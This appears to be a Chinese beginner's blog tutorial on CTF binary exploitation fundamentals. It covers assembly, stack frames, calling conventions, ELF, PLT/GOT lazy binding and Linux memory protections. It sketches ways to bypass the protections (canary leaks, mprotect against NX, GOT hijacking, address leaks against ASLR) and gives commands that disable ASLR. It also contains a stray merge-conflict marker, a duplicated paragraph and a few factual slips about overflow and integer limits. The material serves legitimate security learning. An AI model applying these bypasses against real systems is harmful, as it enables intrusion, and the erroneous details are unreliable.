不难发现两个操作数指令的目的寄存器都是第一个寄存器，刚开始看的话有些奇怪。\n细心的同学可能会注意到call和jmp指令看起来效果都一样，但是描述却有些不同，call的话是函数调用，需要一些函数地址的保存压栈参数传递的操作，而jmp指令类似于C、Python语言的函数中的if、else语句，只涉及跳转，不能作为函数调用来使用。\n另外在pop时rsp为何是+8而不是-8。\n上述问题留到之后的调用约定中讲解\u0026hellip;\u0026hellip;\n了解到上述汇编语言后，感觉生词特别多，这对我感觉也是，不过我建议还是学过C语言和有一点入门Python之后再去看汇编语言，不然会很坐牢的，因为：\n计算机在执行汇编代码时，只会顺序执行。\n通过call、jmp、ret这种指令来完成跳转，所以汇编指令代码的执行流并不像高级语言程序一样流程明确。（在学习了C语言的指针这块的知识点，这会让你学汇编比较有利的）\n汇编指令代码会经常跳转导致可读性差一些，但执行效果是和高级语言（C、Python语言）差不多的。\n给点表格太懵了，我列出些例子(assembly\u0026ndash;C)来看看：\n1 2 3 4 5 6 7 8 9 10 11 mov rax 0 ;int a = 0 label1 ;标签1，标签标志作用，用于标记代码中的某个位置，方便程序跳转或引用，标签本身不执行任何操作，仅作为一个 “标记点”，配合跳转指令jmp、jne（例如C中的goto作用），实现程序流程的控制 inc rax ;a++、a = a + 1 loop ;循环体的跳转 cmp rax 100 ;比较rax和100 jge label2 ;if a\u0026gt;= 100, break；这里就是a大于或等于100，就跳转到label2标签下的函数，否则就是小于100（jmp）跳转到label1下。 jmp label1 ;loop label2 ;标签2 mov rax 0 ;将寄存器rax的值设置为0,清零返回（return 0） 不难发现，汇编语言的类似条件语句的jmp、jge不像if、else那样会有个比较符号（\u0026gt;=、\u0026lt;、!=、==）这样明显区分的，而是jge默认有条件跳转——大于等于\u0026gt;=则跳转，jmp则是强制跳转（而不是小于\u0026lt;就跳转），这点需要记住咯。\n这里的jge是通过eflag寄存器中的标志位来判断的，而eflag的标志位是通过之前的cmp来设置的。\nloop的情况稍些复杂，这里单独为其解释下：\n1 2 3 4 5 6 7 8 9 10 mov rcx, 5 ; 设置循环次数为 5（rcx 作为计数器） label_loop: ; 循环体开始标签 ; 循环执行的操作（例如打印、计算等） mov rax, 1 add rax, 2 loop label_loop ; 计数器 rcx 减 1，若不为 0 则跳回 label_loop ; 循环结束后执行这里的代码 mov rbx, 0 ;return 0 loop自带a- -、a =a -1的作用，所以rcx=5的话，那就循环执行5次，rcx=0就退出循环。\n好难啊，要长脑子了\u0026hellip;\u0026hellip;\n还是用C语言开开路吧：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 #include \u0026lt;stdint.h\u0026gt; int main() { uint64_t rcx = 5; // 循环计数器初始值为5 uint64_t rax; //定义rax、rbx、rcx uint64_t rbx; // for循环模拟loop指令：先判断计数器，不为0则执行循环体 for (; rcx \u0026gt; 0; rcx--) { rax = 1; // 对应 mov rax, 1 rax += 2; // 对应 add rax, 2 } rbx = 0; // 循环结束后设置rbx为0；rbx其实在C语言中是没有用的，在汇编语言中就充当类似return 0的作用 return 0; } 数值上下限/溢出 计算机不能存储无限大的数，这个数的数值有一定上限和下限。在这里了解下就好，学C语言都知道的。\n类型 存储空间大小 最小值（一一对应） 最大值（一一对应） char 1个字节 -128 或 0 127 或 255 unsigned char 1个字节 0 255 signed char 1个字节 -128 127 int 2个或4个字节 -32 768 或 -2 147 483 648 32767 或 2 147 483 647 unsigned int 2个或4个字节 0 65535或4 294 967 295 short 2个字节 -32 768 32767 unsigned short 2个字节 0 65 535 long 4个字节 -2 147 483 648 4 294 967 295 unsigned long 4个字节 0 4 294 967 295 long long (C99) 8个字节 -9 223 372 036 854 775 808 9 223 372 036 854 775 807 unsigned long long 8个字节 0 18 446 744 073 709 551 615 如果是unsigned 也就是无符号数，数据的每一位都是代表数据。如果是signed有符号数，那么数据的最高位会被当作符号位处理。0代表正数,1代表负数。\n溢出（这些比较有辨识度，看到就知道是溢出就好）\n数值有上下限范围，那么就不可避免的会有溢出情况。以32位int为例，有以下四种溢出：\n无符号上溢：0xffffffff + 1变成0\n无符号下溢：0-1变成0xffffffff\n有符号上溢：有符号正数0x7fffffff +1 变成负数0x80000000\n无符号下溢：有符号数0x80000000 -1 变成正数0x7fffffff\n这就是整数溢出。通常来说原因就是两点：\n存储位数不够\n溢出到符号位\n整数溢出一般配合别的漏洞来使用。\n汇编小结 汇编语言贯穿PWN、Reverse（逆向）的，比较重要。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 ; 立即寻址方式 mov eax, 11 ; 将11赋值给eax add eax, 114504 ; eax加上114504 sub eax, 1 ; eax减去1 ; 寄存器寻址方式 mov ebx, 0x36d ; 将0x36d赋值给ebx mov edx, ebx ; 将ebx的值赋值给edx ; 直接寻址方式 mov ecx, msg ; 将msg的地址赋值给ecx ; 寄存器间接寻址方式 mov esi, msg ; 将msg的地址赋值给esi mov eax, [esi] ; 将esi所指向的地址的值赋值给eax ; 寄存器相对寻址方式 mov ecx, msg ; 将msg的地址赋值给ecx add ecx, 4 ; 将ecx加上4 mov eax, [ecx] ; 将ecx所指向的地址的值赋值给eax ; 基址变址寻址方式 mov ecx, msg ; 将msg的地址赋值给ecx mov edx, 2 ; 将2赋值给edx mov eax, [ecx + edx*2] ; 将ecx+edx*2所指向的地址的值赋值给eax ; 相对基址变址寻址方式 mov ecx, msg ; 将msg的地址赋值给ecx mov edx, 1 ; 将1赋值给edx add ecx, 8 ; 将ecx加上8 mov eax, [ecx + edx*2 - 6] ; 将ecx+edx*2-6所指向的地址的值赋值给eax ; 输出字符串 mov eax, 4 ; 系统调用号4代表输出字符串 mov ebx, 1 ; 文件描述符1代表标准输出 mov ecx, msg ; 要输出的字符串的地址 mov edx, 22 ; 要输出的字符串的长度 int 0x80 ; 调用系统调用 ; 退出程序 mov eax, 1 ; 系统调用号1代表退出程序 xor ebx, ebx ; 返回值为0 int 0x80 ; 调用系统调用 Linux基础 这一章内容多是一些文字描述，也会有生活案例加以理解，图片较少，较为枯燥。\n保护层级：分为四个ring0-ring3。一般来说就两个：0为内核，3为用户。\n权限：用户分为多个组\n文件和目录等等的权限一般都是三个，即可读可写可执行， 读：R，写：W，执行：X\n赋予一个可执行文件执行权限就是chmod +x filename\n操作系统 在第一阶段学习中我们接触到了Linux操作系统的相关指令：\n名称 作用 示例（以Kali虚拟机为例） ls 列出当前目录文件 ls cd 切换目录 cd/home/ctf pwd 打印当前目录 pwd touch 创建空白文件 touch flag mkdir 创建目录 mkdir /home/ctf rmdir 删除目录 rmdir /home/ctf rm 删除文件 rm flag cp 复制文件 cp /home/ctf/flag /home/flag mv 移动文件 mv flag /home/ctf/flag cat 输出文件内容 cat flag diff 比较两个文件信息 diff flag1 flag2 chmod 切换执行权限 chmod 777 elf1 locate 查找文件 locate flag 数据存储 计算机内部有两种数据的存储形式：大端序、小端序。\n大端序：数据高位存储在计算机地址的低位，数据低位存储在地址的高位。\n小端序：数据高位存储在计算机地址的高位，数据低位存储在地址的低位。\n大端序：高低低高\n小端序：高高低低\n这时我也看不懂，上例子！\n我们以一个数据：0x123456789abcdef；那么0为低地址，7为高地址。\n大端序存储：低位储存到计算机地址高位\u0026hellip;\n0 1 2 3 4 5 6 7 01 23 45 67 89 ab cd ef 将此数据按照字符串输出，得到：\\x01\\x23\\x45\\x67\\x89\\xab\\xcd\\xef\n小端序存储：低位储存到计算机地址的低位\u0026hellip;\n0 1 2 3 4 5 6 7 ef cd Ab 89 67 45 23 01 将此数据按照字符串输出，得到：\\xef\\xcd\\xab\\x89\\x67\\x45\\x23\\x01\n从上面这两种方式比较的话，可以知道，大端序符合人类的阅读习惯；但从存储逻辑、数学运算规律来看，小端序更正常。\nLinux数据存储的格式为小端序\nLinux是小端序储存，所以我们以字符串的形式输入一个数字时，要注意格式，比如输入0xdeadbeef这个数字。\n字符串输入就是“\\xef\\xbe\\xad\\xde”传入给程序。不过好在有pwntools，p32(0xdeadbeef)即可完成自动转换。\n文件描述符 Linux系统中，把一切都看做是文件，当进程打开现有文件或创建新文件时，内核向进程返回一个文件描述符，文件描述符就是内核为了高效管理已被打开的文件所创建的索引，用来指向被打开的文件，所有执行 I/O 操作的系统调用都会通过文件描述符。\n每个文件描述符会与一个打开的文件相对应，不同的文件描述符也可能指向同一个文件。\n相同的文件可以被不同的进程打开，也可以在同一个进程被多次打开。\n我们会在open、read、write这些常见函数中见到。\n0标准输入（stdin）、1标准输出（stdout）、2标准错误（stderr）read(0,buf,size）从stdin中读size个数据到buf中，write(1,buf,size)从buf中取size个数据到stdout中。\n栈（stack） 学过数据结构都知道，这是一种储存方式：是一种遵循「后进先出（LIFO, Last In First Out）」原则的线性数据结构，类似于日常生活中堆叠的盘子 —— 最后放上去的盘子，会被最先取走。\n栈的核心特性： 操作受限：只能在栈的一端（通常称为「栈顶」）进行数据的插入（称为「入栈」或 push）和删除（称为「出栈」或 pop），另一端（「栈底」）固定不动。\n由于函数调用顺序也是LIFO，所以我们能接触到的绝大多数系统，都是通过栈这一数据结构来维护函数调用关系。\n顺序访问：只能从栈顶开始依次访问元素，无法直接访问栈中间或栈底的元素。\n说得我都懵了，这啥？？通俗讲就是栈好比是一个薯片罐，只有一个罐口，把薯片装进去后，最后放的薯片总是被第一个拿出来，倒数第二个被放进去的，在后面被打开时都是第二个先被拿出来，这就是栈的顺序访问特点啦，而栈就是薯片罐这种存储器的名字。\n等会？这放到机器语言如C语言的话，不就是数组吗？为什么那么麻烦要发明这个栈呢？就是方便一些，一把普通菜刀能切水果、剁骨头，为什么要发明水果刀和大砍刀？原因就是方便。\n栈其实就是一个“阉割版”的数组，只能在一头操作。\nLinux种的栈 在linux系统中，系统为每一个进程都安排了一个栈，进程中每一个调用的函数都有自己独立的栈帧。\n在linux系统中，栈是由高地址向低地址生长（小端序）。\n换句话说,高地址为栈底，低地址为栈顶。那么为什么这么反直觉反人类的安排呢？ 我们接触到的一些算法，很多都是用栈来实现的，比如DFS。DFS会将发现的节点存储在栈中，然后访问的顺序就是LIFO。但是很多这种LIFO的算法都会以递归的形式实现。其实，递归的形式实现这些算法本质上来说也是利用栈结构，只不过他没有在程序中另外申请一个栈，而是用的函数调用栈。\n为什么栈从高地址向低地址生长？ 有的说法是这么设计和小端序更配合（比如说访问一个数据的低字节）。\n这里我的认知有限，我也不能解答，过于理论化研究也是很牢的。这只能留到未来的自己去解答了，这里先标记一下以后再单独出一篇Blog文章来讲解。只能先死记一下咯/************。\n调用约定 看标题就是关于函数调用的内容，在上一章汇编指令就有预示了，像call调用函数地址、jmp无条件跳转。\n再来回顾下栈的指令：\npop出栈/弹栈，Pop指令的作用是弹栈，将栈顶的数据弹出到寄存器，然后栈顶指针向下移动一个单位。具体来说：如pop rax，作用就是mov rax [rsp]；add rsp 8（平衡栈指针：当手动修改栈指针后（如临时分配栈空间），用 add rsp, 8 恢复栈的对齐状态，确保后续操作符合 8 字节对齐要求）；\npush压栈，Push指令的作用就是压栈，将栈顶指针向上移动一个单位的距离，然后将一个寄存器的值存放在栈顶，具体来说：如push rax，其实际效果就是：sub rsp 8; mov [rsp] rax；\nadd rsp 8的8怎么来的？在 x86-64 架构（64 位系统）中： 寄存器（如 rsp、rax 等）是 64 位（8 字节）的。内存地址也是 64 位的，最小的可寻址单位是字节，但栈操作通常以8 字节为单位进行对齐（这是系统调用和函数调用的标准要求）。\n函数调用流程 从一个实例出发,main调用func_b, func_b调用func_a。我们从main函数开始，逐步分析栈帧变化:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 void func_a() { //do sth return; } void func_b() { func_a(); dunc_a(); int c = 1; return; } int main() { func_b(); int a = 2; return 0; } 当运行到call func b时main函数的栈帧。Rbp指向栈底,rsp指向栈底 这段栈帧存放了一些main的局部变量。 main函数要调用func b，main只需要call func b， 也就是push rip；mov rip func b；\n那么此时跳转到func_b继续执行，func _b直接执行主逻辑吗？ 显然不是的，被调用函数还需要维护栈帧。\n具体来说，需要以下几步：\npush rbp；将调用函数的栈底指针保存。\nmov rbp rsp；将栈底指针指向现在的栈顶。\nsub rsp xxx；开辟被调用函数的栈帧，此时上一步的rbp就指向栈帧的底。\n图很明了了吧。但我起初一看，为什么int a =2所在地址要高于fun_b函数？不是funb函数要先比int a=2先执行吗？\n自问自答：要理解这个问题，需结合函数调用栈的生长方向和代码执行顺序与栈帧分配的关系来分析，栈是从高地址向低地址生长的\n代码执行顺序是：main → func_b → func_a → 返回 func_b → 定义 int c = 1 → 返回 main → 定义 int a = 2。\n因为每个函数调用通常会占用一个栈帧，所以说fun_b函数会被分配在main函数之下（main函数先执行，固然main是位于高地址），而int a = 2 属于 main 栈帧的局部变量，因此地址高于 func_b 的栈帧。\n来我们继续分析这图，func_b执行完维护栈帧操作后的栈布局。 所谓栈帧的维护就是维护rbp和rsp两个指针。 Rsp永远指向当前栈的顶部（Rsp在哪和栈顶在哪关系不大，但Rsp是指向它所在的栈帧的顶部）。 Rbp用来定位局部变量。\n接着，再往下运行程序，调用func_a函数。\n那这里的每一个栈帧就代表我之前所说的薯片啦，一片片被拿出来，一个个运行。\nfunc_b调用完func_a后的栈布局。至此，示例的函数调用已经完毕。 现在，func_a执行完毕，要返回了。如何维护栈帧呢?\n在这里，我们学习一个新的汇编指令leave：\n\u0026laquo;\u0026laquo;\u0026laquo;\u0026lt; HEAD 作用是维护栈帧，通常出现在函数的结尾，与ret（return）连用。其实际作用为：mov rsp rbp；pop rbp；即：将栈顶指针指向栈帧的底部、然后在栈中弹出新的栈底指针。\n在一个函数执行结束返回时，会执行leave；ret；\n实际效果就是：mov rsp rbp； poprbp； pop eip； 此时我们观察程序执行完func_a时的栈帧，如下图：\n可以说，与之前的func_b未调用func_a前的栈帧对比，是一模一样，说明已经恢复了栈帧。唯一不同之处在于此时程序的rip已经指向了c=1后面一条指令，说明func_a已经执行完毕。\n以此类推，func_b执行完毕返回后，栈布局如下图：\n在这之后，main函数继续执行此时布局变回开始执行程序时的栈布局，直到结束。至此，函数的调用返回执行流程结束。\n总结：\n调用函数：只需要将rip压栈（保存到当前栈帧），即push rip，然后讲rip赋值为被调用函数的起始地址，这一操作被隐性的内置在call指令中。\n被调用函数：push rbp；mov rbp rsp； sub rsp 0xxxx。即保存调用函数的rbp指针，将自己的rbp指针指向栈顶，然后开辟栈空间给自己用，此时rbp就变成了被调用函数的栈底。\n函数返回：leave；ret；翻译过来就是：mov rsp rbp；pop rbp；pop rip；即恢复栈帧,返回调用函数的返回地址。\n这里有个疑问，为什么在调用过程种，寄存器rsp这类会出现很多的赋值操作，比如上述的“mov rsp rbp；pop rbp；pop rip”，rsp更像是一个中间变量，一直变化。其实这是有原因的。\nrsp 看似动态变化，但它的变化是完全遵循栈操作的逻辑和函数调用约定的。栈是一种后进先出的数据结构，在函数调用过程中，参数入栈、局部变量分配内存（通过调整 rsp 来实现）、保存寄存器值等操作，都需要通过修改 rsp 的值来改变栈顶位置，以完成对栈内存的合理使用和管理 。而在函数返回阶段，又要通过调整 rsp 来恢复之前的栈状态，释放当前函数占用的栈空间。\n而rbp 明确划分了当前函数栈帧的范围：从 rbp（底部）到 rsp（顶部）之间的内存区域，它更像是一个固定的描点，数值不变依靠rsp变化来完成操作。\n所以，这些寄存器的赋值操作都是为了严格按照计算机体系结构和编程语言的函数调用规范，实现函数调用、执行和返回过程中的内存管理、数据保护以及程序执行流的正确控制。\n简单说，rsp 是 “动态变化的栈顶指针”，而 rbp 是 “固定不动的栈帧基准”—— 前者负责管理栈的实时状态，后者负责锚定当前栈帧的位置和范围、栈帧的局部变量，二者配合实现了函数调用过程中内存的有序管理。\n调用约定 返回值：一般来说,一个函数的返回值会存储到RAX寄存器。 X86-64函数的调用约定为：\n从左至右参数一次传递给rdi、rsi、rdx、rcx、r8、r9。\n如果一个函数的参数多于6个，就不在寄存器传参了，而是从右至左压入栈中传递。\n作用是维护栈帧，通常出现在函数的结尾，与ret（return）连用。其实际作用为：mov rsp rbp；pop rbp；即：将栈顶指针指向栈帧的底部、然后在栈中弹出新的栈底指针。\n系统调用 syscall指令，用于调用系统函数，调用时需要指明系统调用号码。系统调用号存在 rax 寄存器中，然后布置好参数，执行syscall即可。\n调用号码 名称 0 read 1 write 2 open 3 close 9 mmap 37 alarm 60 exit 62 kill 59 execv 还有一些调用号码没列出来，其实上网查一查就行，这东西用多了就记住了，前期不用刻意死记硬背的。\n看到这里，是不是有点熟悉，看过《第一阶段》的操作系统章节就知道，有chmod 777 \u0026lt;文件\u0026gt;：设定文件使用权限的指令。正好就是1+2+4，4代表是x执行权限，这里表格没写出来。所以入门pwn我就建议大家去学那个Linux操作系统，基础过一下，不用精通，不然你强行入门PWN很懵的。\n示例：调用read(0,buf,size)：\n从左至右参数一次传递给rdi、rsi、rdx、rcx、r8、r9（寄存器）\n1 2 3 4 5 mov rax 0; read\u0026#39;s syscall number mov rdi 0; first arg mov rsi buf; second arg mov rdx size; third ard syscall; execute read(0,buf,size); ELF文件 elf linux环境中，二进制可持性文件的类型是ELF（Executable and Linkable Format）文件。\nelf文件的格式比较简单，我们需要了解的就是elf文件中的各个节、段等概念。elf的基本信息存在于elf的头部信息中，这些信息包括指令的运行架构、程序入口等内容，可以通过readelf -h \u0026lt;elf_name\u0026gt;来查看头部信息，当然打过CTF-MISC的知道的话估计会去用010editor，都可。\n第二第三张图就是ELF文件了，这种文件并不是常规的ZIP这些噢。\nelf文件中包含许多个节（section），各个节中存放不同的数据，这些节的信息存放在节头表中，readelf -S \u0026lt;file\u0026gt;查看，这些节主要包括：\n名称 作用 .text 存放程序运行的代码 .rdata 存放一些如字符串等不可修改的数据 .data 存放已经初始化的可修改的数据 .bss 存放未被初始化的程序可修改的数据 .plt 与 .got 程序动态链接函数地址 elf文件不是我们所说的常规文件，不在我们的电脑桌面上，而是存在磁盘文件里，它本质上是存储在磁盘（硬盘、SSD 等）上的 “常规文件”，运行程序时，这个程序的elf文件才会加载到内存里，这就是我们所说的运行内存。\nelf文件在加载进入内存时： elf文件的节（section）会被映射进内存中的段（segment），而这一映射过程遵循的机制是根据各个节的权限来进行映射的。\n换句话说，可读可写的节被映射入一个段，只读的节被映射入一个段。\n单个elf文件内部多个节被合并映射入一个段，此时就标志着elf文件被启动运行了。\n根据上述讲解，可以知道ELF文件以两种状态存在：\n状态 存储位置 用途 能否被CPU直接执行 未运行时 磁盘 保存程序的指令和数据（静态文件） 不能（CPU只认识内存数据） 运行时 运行内存 CPU从内存读取指令并执行 能 In other words，ELF 文件是 “程序的静态载体”（存磁盘），确保程序能从源代码正确转换为可执行文件，并在内存中被正确加载和运行。\nlibc 什么是libc?\nglibc是linux下面C标准库的实现，全称GNU C Library。\nglibc本身是GNU旗下的C标准库，后来逐渐成为了Linux的标准C库，而Linux下原来的标准C库Linux libc逐渐不再被维护。\nLinux下面的标准C库不仅有这一个，如uclibc、klibc，以及上面被提到的Linux libc，但是glibc无疑是用得最多的。glibc在/lib目录下的.so文件为libc.so.6。\n等等\u0026hellip;\u0026hellip;so后缀？？.so时啥文件，本质上也是个elf文件\n通常.so用./的指令运行后会给出版本信息，当然，用file命令也是可以的:\nLinux基本上所有的程序都依赖libc，所以libc中的函数至关重要。当然CTFpwn也离不开libc：IDA分析libc、源码。\n延迟绑定机制 在上章的elf文件，看到了.got和.plt文件，用于动态链接函数地址。\n动态链接库 我们程序开发过程中都会用到系统函数，比如read，write， open等等。这些系统函数不需要我们实现,因为系统已经帮你完成这些工作，只需要调用即可，存放这些函数的库文件就是动态链接库。通常情况下，我们对于PWN接触到的动态链接库就是libc.so文件。\n静态编译和动态编译 这里我们举一个例子来类比静态编译与动态编译的概念：\n小明要开一个餐馆（program），餐馆的菜单上有几百种菜肴（函数），小明的餐馆每天都会来很多顾客，每个顾客点的菜都可能不一样。我们知道，每道菜所需要的食材（系统函数）都不一样，这些食材都存放于仓库（动态链接库）中。\n那么现在问题来了，小明如何保证每个顾客点的菜都能被满足呢？\n第一种方式：小明把仓库中所有的食材都搬进厨房（静态编译）这时，小明不需要挪地方（静态），只需要在厨房中就可以工作，但是 这会带来冗余，可能厨房中的食材很多都用不上。高效\n第二种方式：小明每次遇到新的所需要的食材，才去仓库取（动态编译）。这时，小明可能挪动的比较频繁（动态），但是可以保证厨房面没那么多可能用不到的东西。全面\n一个程序运行过程中可能会调用许许多多的库函数，这些库函数在一次运行过程中不能保证全部被调用。\n静态编译的思路就是将所有可能运行到的库函数一同编译到可执行文件中。这一方式的优点就在于在程序运行中不需要依赖动态链接库。适用的场合就是比如你本地编译的程序需要的动态链接库版本比较特殊，如果在别的机器上运行可能对方动态链接库版本和你不一样会出bug，这时候用静态编译。\n缺点就是变异过后程序体积很大，编译速度也很慢。\n对于动态编译，优点是缩小了执行文件本身的体积，另一方面是加快了编译速度，节省本地的系统资源。\n缺点是使用链接库的命令，需要附带相对庞大的链接库，如果其他计算机没有安装对于的运行库，则动态编译的可执行文件就不能运行。\n欸欸看回小明，他要选第二种方式（动态编译），但每次去仓库找食材太麻烦了，而且仓库这么大，，于是他用小本本记下了在仓库的每样食材的位置（got表），下一次找这件食材就高效多了。这就是got。\n延迟绑定 这就是linux的延迟绑定机制，而存放这个地址的小本子就是got表。got表全程是Global Offset Table，也就是全局偏移量表。\n在程序运行时，got表初始并不保存库函数的地址，只有在第一次调用过后，程序才将这一地址保存在got表中。\nPLT与GOT GOT（Global Offset Table，全局偏移表）：数据段用于地址无关代码的 Linux ELF 文件中确定全局变量和外部函数地址的表。\nPLT（Procedure Linkage Table，程序链接表）： Linux ELF 文件中用于延迟绑定的表。\nELF 中有.got和.plt.got 两个 GOT 表，got 表用于全局变量的引用地址，.got.plt 用于保存函数引用的地址。\n不论是第几次调用外部函数，程序真正调用的其实是plt表。plt表其实是一段段汇编指令构成。\nPLT 工作流程 在第一次调用外部函数时，plt表首先会跳到对应的got表项中。由于并没有被调用过，此时的got表存储的不是目标函数地址，此时的got表中存储的地址是pt表中的一段指令，其作用就是准备一些参数，进行动态解析。跳转回plt表后，plt表又会跳转回plt的表头，表头内容就是调用动态解析函数，将目标函数地址存放入got表中。\n第一次调用外部函数，以调用C语言的printf为例子去详细讲解：\n1、调用时，汇编语言执行到call printf时，先跳向PLT表中printf对应的条目（plt[printf]），这么说好像起到jmp跳转地址的作用啊。只是类似，并未跳转地址，而此时编译还不知道，而是先跳转PLT表中位该函数预留的一个”小跳板“（plt[printf]）。\n2、**plt[printf]**第一次被调用时，此时GOT表中还没被填充真实地址（因为此前没有被解析过），所以里头并不是printf的真实地址，而是plt[printf]中下一条指令的地址（也就是jmp*GOT[printf]）。\ncall printf → 跳向plt[printf] → 执行jmp *GOT[printf] → 此时GOT[printf]里已是真实地址，直接跳过去执行。此时就知道printf的真实地址了。\n3、**跳回PLT后，执行”准备解析参数“的指令。**plt[printf]的下一条指令是准备动态解析需要的参数：比如把printf对应的符号索引（用于告诉动态链接器 “要解析哪个函数”）压入栈中。这些参数是提前在编译时就写好的，目的是告诉动态链接器 “我要找的是printf，帮我查它的真实地址”。这些参数是提前在编译时就写好的，目的是告诉动态链接器 “我要找的是printf，帮我查它的真实地址”。\n4、**跳向PLT表头（plt[0]），触发动态链接器的解析函数。**准备好参数后，plt[printf]会跳向 PLT 表的 “表头”（plt[0]）。plt[0]里的指令是固定的：先把GOT[0]的地址压栈（GOT[0]存储着动态链接器需要的辅助信息），然后调用动态链接器的核心解析函数（_dl_runtime_resolve）。\n？？？这有个疑问，怎么会有函数来帮助外部函数如printf去确定地址呢？其实这个_dl_runtime_resolve函数比较特殊，它是动态链接器的组成部分，是已经预先存在于动态链接器的代码之中的，动态链接器一加载，它的地址就被先解析出来了。\n5、动态链接器解析出真实地址，写入 GOT 表，完成绑定\n以下是用汇编语言代码来概括这五步流程：\n1 2 3 4 plt[printf]: jmp *GOT[printf] ; 第1行：跳向GOT[printf]存储的地址 push 0x123 ; 第2行：压入printf的符号索引（假设是0x123） jmp plt[0] ; 第3行：跳向PLT表头 这五步也就系统概括了小明在厨房做菜麻烦需要用小本本记下仓库的所需食材的存放地方（地址）的过程。\n总结：PLT 和 GOT 的协作核心\nPLT 是 “跳板”：负责第一次调用时触发解析流程，后续调用时直接转发到 GOT 中的真实地址。\nGOT 是 “缓存表”：第一次调用时存储 PLT 内的跳转地址（用于触发解析），解析后存储函数真实地址（供后续直接调用）。 整个机制的目的是 “延迟解析”：避免程序启动时解析所有外部函数（耗时），只在第一次调用时解析，平衡启动速度和运行效率。\n理解了这个流程，就掌握了动态链接中最核心的 “懒绑定” 机制，这也是 CTFpwn 中 “PLT 劫持” 等漏洞利用的基础。\nLinux安全防护机制 栈溢出、指针悬挂、内存地址泄露等Bug会导致程序崩溃，一些攻击者会刻意制造这些漏洞来扰乱程序正常执行，这就是早期PWN的威力。这一章比较重要，几乎贯穿后续栈溢出、堆的题目。\n保护机制 CANARY、NX、ASRL、PIE、RELRO\n栈的作用为存储函数调用相关信息以及函数的局部变量。\n这些局部变量通常为数组或者输入的缓冲区（buf）。而函数调用相关的信息，主要是返回地址和栈底指针（rbp）。\nCANARY Canary中文翻译就是金丝雀，来源是之前科技不发达时，矿工会在下井作业时带一个金丝雀，用来判断地下环境有没有煤气之类的毒气泄漏，金丝雀没事，大家继续干活；金丝雀如果死了，大家赶紧跑。\n在Linux中，Canary的作用就如同他引用的一样，用来判断程序的执行环境，主要是针对检测栈溢出。\ncanary是一个开头字节为\\x00的一段长度为八个字节(x64)的随机数，这个随机数本体存放于 fs 段偏移为 0x28 的区域。\n在每次函数调用中，程序都会将这段随机数存放于栈底，每次运行结束返回时，都会将这一随机数与他的本体进行比对。如果这个值被改变，则意味着发生了栈溢出，程序直接退出，没有改变的话，程序继续执行。\n由于canary开头字节为x00，所以通常情况下不能被打印出来。\n通常情况下，程序如果开启了canary保护，大概率说明这道题目不是栈溢出题目了。当然也要具体情况具体分析。\n绕过方法主要就是修改canary或者泄漏canary。\n泄漏 canary：利用格式化字符串、栈溢出 + 输出功能等漏洞，读取栈上的 canary 值（注意首字节 \\x00 的影响）。\n修改 canary：用泄漏的 canary 值，在栈溢出时覆盖栈上的 canary，使其与原始值（fs:0x28 处）一致，绕过检查。\nNX NX意思就是Not Executable，开启这个保护后，程序中的堆、栈、bss段等等可写的段就不可以执行。这就意味着如果开启了NX保护，通常情况下我们就不能执行我们自己编写的shellcode。\n绕过的方式通常是用mprotect函数来改写段的权限，nx保护对于rop或者劫持got表利用方式不影响。\nPIE和ASLR 在我们编写ROP或者shellcode时，有一个问题是绕不开的，那就是找到函数地址：\nPIE指的就是程序内存加载基地址随机化，意味着我们不能一下子确定程序的基地址。\nASLR与PIE大同小异，ASLR是程序运行动态链接库、栈等地址随机化。\n通常来说，CTF中的PWN题与这两个保护打交道的次数最多。\n绕过方式就是泄露函数地址，然后通过函数的偏移来确定基地址。\nPIE：是针对可执行文件本身的编译选项。开启后，可执行文件（ELF）会被加载到内存中的随机地址，其内部的代码段、数据段等位置不再是固定值（编译时不指定绝对地址，而是用相对偏移）。 作用：让攻击者无法预先知道程序代码、全局变量等在内存中的绝对地址。\nASLR：是操作系统级别的保护机制。开启后，操作系统会随机化进程的内存布局，包括共享库（.so）的加载地址、栈、堆、内核映射区域等的起始地址。 作用：让攻击者无法预测共享库函数（如 libc 中的 system）、栈 / 堆数据的内存地址。\n该文件只有 3 种合法取值，分别对应不同的 ASLR 策略，具体如下：\n取值 名称 作用（随机化范围） 安全强度 0 关闭ASLR 完全不随机化：栈、堆、共享库、内核空间的地址每次运行都固定不变。 最低 1 部分随机化（默认） 部分区域随机：栈地址、VDSO（虚拟动态共享对象）地址随机化；堆、共享库地址不随机。 中等 2 完全随机化 全区域随机：栈、堆、共享库、VDSO 地址全部随机化；64 位系统还会随机化内核空间。 最高 1）查看当前 ASLR 状态\n1 2 # 读取文件内容，输出 0/1/2 中的一个 cat /proc/sys/kernel/randomize_va_space （2）临时修改 ASLR 强度\n1 2 3 4 5 6 # 1. 关闭 ASLR sudo echo 0 \u0026gt; /proc/sys/kernel/randomize_va_space # 2. 恢复默认部分随机化 sudo echo 1 \u0026gt; /proc/sys/kernel/randomize_va_space # 3. 开启完全随机化（高安全需求） sudo echo 2 \u0026gt; /proc/sys/kernel/randomize_va_space ​\n关联：两者通常配合使用 ——PIE 让可执行文件本身地址随机化，ASLR 让系统其他内存区域随机化，共同增加内存地址预测难度。\n区别核心：PIE 是编译时决定的程序属性，ASLR 是系统运行时的布局策略。\n通俗点理解：\nASLR 是操作系统搞的 “整体大洗牌”：每次程序运行时，系统会把整个内存空间的布局（比如共享库放哪、栈和堆从哪开始）随机换个位置，让攻击者猜不到常用函数（比如 system）或数据的具体地址。 ASLR 像每次开演唱会时，场馆里的座位区（共享库）、后台（堆）、观众入口（栈）的位置都随机换。\nPIE 是针对单个程序的 “自身随机化”：如果程序编译时开了 PIE，它自己加载到内存时，代码和数据会随机放在一个不确定的位置（而不是固定地址），让攻击者连程序自己的函数、变量在哪都猜不准。 PIE 像演出团队（程序本身）每次上场时，自己的站位（代码和数据）也随机变。\nRELRO RELRO（Relocation Read-Only，重定位只读）是一种针对 ELF 文件重定位表的保护机制，核心作用是限制对 GOT（全局偏移表）等重定位相关区域的修改权限，防止攻击者通过篡改 GOT 表实现函数劫持（如修改printf的 GOT 条目为system地址）。\n这个保护主要针对的是延迟绑定机制，意思就是说got表这种和函数动态链接相关的内存地址，对于用户是只读的。\n开启了这个保护，意味着我们不能劫持got表中的函数指针。\nRELRO 的两种模式及作用:\nPartial RELRO（部分 RELRO）\n仅将 GOT 表的前半部分（.got.plt）设置为只读，后半部分仍可写。 作用：基本防止对已解析的函数地址（GOT 